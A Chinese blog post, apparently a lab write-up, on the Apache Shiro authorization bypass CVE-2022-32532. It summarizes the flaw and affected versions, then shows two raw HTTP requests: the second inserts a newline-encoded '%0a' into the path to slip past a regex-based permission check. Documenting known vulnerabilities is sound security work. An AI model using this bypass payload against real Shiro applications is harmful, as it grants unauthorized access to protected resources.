# Shiro 授权绕过 （CVE-2022-32532） - YikJiang - 博客园

> 原文：[`www.cnblogs.com/YikJiang/p/17266012.html`](https://www.cnblogs.com/YikJiang/p/17266012.html)

![在这里插入图片描述](img/8566895b7ca89aa49c8e5e50d6ed0cff.png)

### Shiro 授权绕过 （CVE-2022-32532）

#### 一、产品简介

Apache Shiro 是一个强大且易用的 Java 安全框架,执行身份验证、授权、密码和会话管理。

1.9.1 之前的 Apache Shiro，RegexRequestMatcher 可能被错误配置为在某些 servlet 容器上被绕过。在正则表达式中使用带有 `.` 的 RegExPatternMatcher 的应用程序可能容易受到授权绕过。

#### 二、漏洞概述

2022 年 6 月 29 日，Apache 官方披露 Apache Shiro 权限绕过漏洞(CVE-2022-32532)，当 Apache Shiro 中使用 RegexRequestMatcher 进行权限配置，且正则表达式中携带“.”时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证。

#### 三、影响范围

Apache Shiro < 1.9.1

#### 四、利用流程

访问

![image-20221224001446418](img/89572d602749a452821f35f3d9a9a3c6.png)

抓包修改

```
GET /permit/any HTTP/1.1
Host: 123.58.224.8:36930
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: think_lang=zh-cn
Connection: close
9ce8e997-1496-4435-95d8-e697e8c6925a 
```

![image-20221224001506486](img/f7a17bda55573d9ad105d914eedca50a.png)

需要携带 token 字段

![image-20221224001638940](img/2444f27af5140a8e2d59818adac5d5da.png)

改包绕过

```
GET /permit/%0any HTTP/1.1
Host: 123.58.224.8:36930
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: think_lang=zh-cn
Connection: close 
```

![image-20221224002300059](img/bd60552f32ca00ca042a8d9acae2bed8.png)